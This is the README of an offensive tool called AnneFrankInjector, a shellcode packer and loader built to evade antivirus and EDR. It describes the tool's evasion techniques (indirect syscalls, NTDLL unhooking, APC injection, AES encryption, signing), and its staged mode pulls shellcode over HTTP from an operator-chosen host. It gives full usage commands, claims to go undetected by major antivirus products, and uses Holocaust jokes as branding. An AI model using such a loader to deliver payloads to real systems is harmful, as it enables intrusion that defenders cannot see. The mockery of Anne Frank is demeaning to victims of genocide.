# AnneFrankInjector
          
```          
    █████╗ ███╗   ██╗███╗   ██╗███████╗███████╗██████╗  █████╗ ███╗   ██╗██╗  ██╗
   ██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔════╝██╔══██╗██╔══██╗████╗  ██║██║ ██╔╝
   ███████║██╔██╗ ██║██╔██╗ ██║█████╗  █████╗  ██████╔╝███████║██╔██╗ ██║█████╔╝ 
   ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══╝  ██╔══██╗██╔══██║██║╚██╗██║██╔═██╗ 
   ██║  ██║██║ ╚████║██║ ╚████║███████╗██║     ██║  ██║██║  ██║██║ ╚████║██║  ██╗
   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
                                                                                  
    ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗ ██████╗ ██████╗ 
    ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
    ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║   ██║██████╔╝
    ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║   ██║██╔══██╗
    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║
    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝

     A N N E   F R A N K   I N J E C T O R
     v1.0 - "Hiding payloads in your attic since 2026"

     She hides better than Anne in the annex...
     But your AV still finds her and calls the Defender
```

> [!TIP]
> Did AnneFrankInjector help you hide your shellcode during a penetration test or while pwning a cert exam? If so, please consider giving it a star ⭐!

## Table-Of-Contents

- [AnneFrankInjector](#annefrankinjector)
  * [Goal](#goal)
  * [General Information](#general-information)
  * [Evasion Features](#evasion-features)
  * [Installation](#installation)
    + [Makefile](#makefile)
  * [Usage](#usage)
    + [Format option](#format-option)
    + [Staged](#staged)
    + [Stageless](#stageless)
  * [To-Do](#to-do)
  * [Detections](#detections)
  * [Credits - References](#credits---references)

## Goal

This repository was created to facilitate AV/EDR evasion during CTFs and red team engagements. The goal is to focus more on pwning rather than struggling with detection!

Your shellcode hides better than Anne Frank in the annex – until some nosy neighbor (Defender) rats it out.

Check out my blog post for more infos: [Evade Modern AVs in 2025](#)

## General Information

>[!CAUTION]
>This tool is designed for authorized operations only. 

>[!NOTE]
>- The techniques used in the loader are nothing new. The loader generated from this packer will probably NOT evade modern AVs / EDRs long-term. Do not expect miracles – she still gets discovered after ~2 years.
>- Most of the evasion techniques used here are NOT from me. I just crammed a bunch of known tricks together like hiding them in an attic.
>- Depending on the interest shown to this project, I might add some techniques from my own research and maybe rewrite the whole thing into a much more capable injector.

## Evasion Features

- Indirect Syscalls via Syswhispers (rewrote in NASM compatible assembly)
- API Hashing
- NTDLL unhooking via Known DLLs technique
- Custom GetProcAddr & GetModuleHandle functions
- Custom AES-128-CBC mode encryption & decryption
- EarlyBird APC Injection
- Possibility to choose between staged or stageless loader
- "Polymorphic" behavior with the -s argument (scramble like changing hiding spots)

## Installation

Depending on your OS, the installation will slightly differ. In general, make sure you have the following stuff installed:

- CLANG compiler
- MinGW-w64 Toolchain
- Make

If I am not mistaken, those are by default installed on KALI Linux. However, if you want to install them manually, this should do the trick:

```bash
# Assuming Debian based system
sudo apt update
sudo apt install clang pipx mingw-w64 make lld nasm osslsigncode

# Verify installation
clang --version
make --version

# or
clang -v

# If this is the case, refer to the chapter "Makefile" to replace the compiler in the Makefile of the templates
```

It's a bit of a different story on Windows. You need to install the MinGW-w64 toolchain by installing MSYS2 first.

```powershell
# Go there and install this
https://www.msys2.org/

# Then
pacman -Syu
pacman -S mingw-w64-x86_64-clang

# Veryify installation
x86_64-w64-mingw32-clang --version

# Install make
pacman -S make

# Verify installation
make --version
```

You should also check under `C:\msys64\mingw64\bin`. This is a common place where the toolchain is being installed.

After the basis installation, don't forget to install the python requirements ! Otherwise the packer will not work :D !

**Linux**:
```bash
# Via pipx (preferred way)
cd afpacker
python3 -m pipx install .
# You can use afpacker globaly now

# Via manual virtual environment
cd afpacker
python3 -m venv env
source env/bin/activate
python3 -m pip install .

# Once you're done using the tool
deactivate

# Old fashion
cd afpacker
python3 -m pip install -r requirements.txt --break-system-packages
python3 main.py -h
```
**Windows**:
```powershell
# Via pip
cd afpacker
python3 -m pip install .

# Done ! :)
```

### Makefile

You should NOT modify the Makefile unless you know what you are doing! But check the compiler line like before.

## Usage
## Usage

General usage:
```
usage: main.py [-h] {staged,stageless} ...

afpacker

positional arguments:
  {staged,stageless}  Staged or Stageless Payloads
    staged            Staged
    stageless         Stageless

options:
  -h, --help          show this help message and exit
```

Staged:

```
usage: main.py staged [-h] -p PAYLOAD [-f {EXE,DLL}] -i IP_ADDRESS -po PORT -pa PATH [-o OUTPUT] [-e] [-s] [-pfx PFX] [-pfx-pass PFX_PASSWORD]

options:
  -h, --help            show this help message and exit
  -p PAYLOAD, --payload PAYLOAD
                        Shellcode to be packed
  -f {EXE,DLL}, --format {EXE,DLL}
                        Format of the output file (default: EXE).
  -i IP_ADDRESS, --ip-address IP_ADDRESS
                        IP address from where your shellcode is gonna be fetched.
  -po PORT, --port PORT
                        Port from where the HTTP connection is gonna fetch your shellcode.
  -pa PATH, --path PATH
                        Path from where your shellcode uis gonna be fetched.
  -o OUTPUT, --output OUTPUT
                        Output path where the shellcode is gonna be saved.
  -e, --encrypt         Encrypt the shellcode via AES-128-CBC.
  -s, --scramble        Scramble the loader's functions and variables.
  -pfx PFX, --pfx PFX   Path to the PFX file for signing the loader.
  -pfx-pass PFX_PASSWORD, --pfx-password PFX_PASSWORD
                        Password for the PFX file.

Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'
```

Stageless:

```
usage: main.py stageless [-h] -p PAYLOAD [-f {EXE,DLL}] [-e] [-s] [-pfx PFX] [-pfx-pass PFX_PASSWORD]

options:
  -h, --help            show this help message and exit
  -p PAYLOAD, --payload PAYLOAD
                        Shellcode to be packed
  -f {EXE,DLL}, --format {EXE,DLL}
                        Format of the output file (default: EXE).
  -e, --encrypt         Encrypt the shellcode via AES-128-CBC.
  -s, --scramble        Scramble the loader's functions and variables.
  -pfx PFX, --pfx PFX   Path to the PFX file for signing the loader.
  -pfx-pass PFX_PASSWORD, --pfx-password PFX_PASSWORD
                        Password for the PFX file.

Example usage: python main.py stageless -p shellcode.bin -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'
```

### Format option

In both cases, staged or stageless, you can choose whether to compile your loader as an EXE or a DLL. To compile it as a DLL, simply append `-f DLL`. By default, it compiles as an EXE, though you can also explicitly specify this using -f EXE (but you don't need to).

The DLL version exports a function called `ctf`. This is the function you need to call to start the exection. 

```powershell
rundll32.exe afloader.dll,ctf
```

### Staged

When using the staged "mode", the packer will generate you a .bin file named accordingly to your `-o` arg. With the `-pa` argument, you are actually telling the loader *where* on the websever (basically the path) it should search for that .bin file. So TLDR those two values should usually be the same.

Example:

```powershell
python main.py staged -p "C:\Code\afpacker\calc.bin" -i 192.168.2.121 -po 8080 -pa /shellcode.bin -o shellcode -s -pfx cert.pfx -pfx-pass Password
```


## To-Do

- [x] Setup.py / pipx support
- [ ] More injection techniques (maybe "Betrayed by Neighbor" self-delete)
- [ ] AMSI / ETW bypass (because even the diary needs silencing)

## Detections

- Undetected on the latest Windows 11 Defender
- Undetected on Windows 10 Defender
- Undetected on Sophos, Kaspersky, etc.

## Credits - References

Most of the code is not from me. Here are the original authors (now properly credited under the new project):

```
@ Excalibra         - Main developer, attic architect, and professional snitch-hater
@ Maldevacademy     - https://maldevacademy.com
@ SaadAhla          - https://github.com/SaadAhla/ntdlll-unhooking-collection
@ VX-Underground    - https://github.com/vxunderground/VX-API/blob/main/VX-API/GetProcAddressDjb2.cpp
@ klezVirus         - https://github.com/klezVirus/SysWhispers3
```
